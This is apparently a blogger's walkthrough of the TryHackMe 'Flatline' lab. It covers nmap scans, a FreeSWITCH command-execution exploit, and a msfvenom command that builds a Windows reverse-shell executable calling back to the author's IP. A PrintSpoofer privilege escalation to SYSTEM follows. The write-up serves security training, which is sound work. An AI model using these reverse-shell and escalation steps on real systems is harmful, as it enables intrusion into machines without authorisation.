---
layout: default
title : muzec - Flatline TryHackMe writeup
---

Now that is some easy and annoying machine don't get me wrong man it a fun machine really but the annoying part is that it take a long time to boot up XD let jump in already man.

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oN nmap/full.tcp 10.10.20.232  -v -Pn
```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/flatline]
└─$ nmap -p- --min-rate 10000 -oN nmap/full.tcp 10.10.20.232  -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-26 08:00 WAT
Initiating Parallel DNS resolution of 1 host. at 08:00
Completed Parallel DNS resolution of 1 host. at 08:00, 0.26s elapsed
Initiating Connect Scan at 08:00
Scanning 10.10.20.232 [65535 ports]
Discovered open port 3389/tcp on 10.10.20.232
Connect Scan Timing: About 29.40% done; ETC: 08:02 (0:01:14 remaining)
Discovered open port 8021/tcp on 10.10.20.232
Completed Connect Scan at 08:02, 82.34s elapsed (65535 total ports)
Nmap scan report for 10.10.20.232
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
8021/tcp open  ftp-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 82.68 seconds
```

No we know we have just 2 open ports let throw in some service detection and default nmap scripts to know what we are dealing XD.

```
nmap -sC -sV -oN nmap/normal.tcp -p 3389,8021 10.10.20.232 -Pn
```

```
# Nmap 7.91 scan initiated Sat Feb 26 08:04:03 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p 3389,8021 -Pn 10.10.20.232
Nmap scan report for 10.10.20.232
Host is up (0.18s latency).

PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-26T10:03:56+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
|_ssl-date: 2022-02-26T10:03:59+00:00; +2h59m41s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h59m40s, deviation: 0s, median: 2h59m39s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 26 08:04:18 2022 -- 1 IP address (1 host up) scanned in 15.65 seconds
```

Now more better seems we are dealing with windows ahhhhh should be fun we have a default `RDP` port open and a strange one which is `8021` freeswitch let do some research if it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/155839121-ff62de83-4aaf-4a2c-8b83-ebb4c18350ad.png)

Ahhh yes command execution exploit let download and give it a try.

![image](https://user-images.githubusercontent.com/69868171/155839178-ad465075-3803-437a-a48a-9f103bc8f0e9.png)

Boom working let try to generate a reverse shell payload file `exe` and transfer it to the target so we can execute it and get a stable shell back to our terminal.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/flatline]                                                                                                            
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.156 LPORT=1337 -f exe > shell.exe                                                                       1 ⨯ 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                 
[-] No arch selected, selecting arch: x64 from the payload                                                                                                             
No encoder specified, outputting raw payload                                                                                                                           
Payload size: 460 bytes                                                                                                                                                
Final size of exe file: 7168 bytes
```

We start our `python server` on our local machine to transfer it ot the target.

![image](https://user-images.githubusercontent.com/69868171/155839282-a65c1a7d-aeb5-430b-bf01-15c5418f7821.png)

Boom file transfer successfully now let start our `ncat listener` and execute the file to get our reverse sehll back.

![image](https://user-images.githubusercontent.com/69868171/155839346-ebe051b8-4555-4f4b-91f7-b703ee846209.png)

Now that is a stable shell and we have `user.txt` time to get the root.


### Privilege Escalation

Let check the privilege we have on the system and what we can abuse to get `nt authority\system` .

```
whoami /priv
```

![image](https://user-images.githubusercontent.com/69868171/155839468-1b1fc597-0e58-4d4f-9f5b-48a6977d9ff5.png)

Boom seems we have `SeImpersonatePrivilege` enabled we can use `printspoofer` to abuse it to get system shell.

![image](https://user-images.githubusercontent.com/69868171/155839518-78efdaff-6712-4b57-83d3-3a0e78ebdd59.png)


Now let transfer it and run it.

![image](https://user-images.githubusercontent.com/69868171/155839573-fb18e193-3335-4398-b0da-df4107a0568f.png)

Now let confirm if we are system already with the command `whoami` .

![image](https://user-images.githubusercontent.com/69868171/155839619-0674ed99-2df2-4fb6-8380-9f83f57affeb.png)

We are done i told you it easy XD.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
